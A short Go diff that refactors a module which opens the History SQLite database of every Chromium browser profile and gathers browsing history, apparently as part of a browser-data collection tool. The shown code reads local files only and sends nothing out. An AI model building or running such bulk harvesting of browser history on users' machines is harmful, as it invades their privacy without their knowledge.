@@ -1,9 +1,9 @@
-package history
+package historyChromium
 
 import (
 	"database/sql"
 	"encoding/json"
-	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/structs"
 )
 
 type History struct {
@@ -14,6 +14,9 @@ type History struct {
 func Get(browsersList []structs.Browser) string {
 	var history []History
 	for _, browser := range browsersList {
+		if !browser.IsChromium {
+			continue
+		}
 		for _, profile := range browser.Profiles {
 			path := profile.History
 			db, err := sql.Open("sqlite3", path)
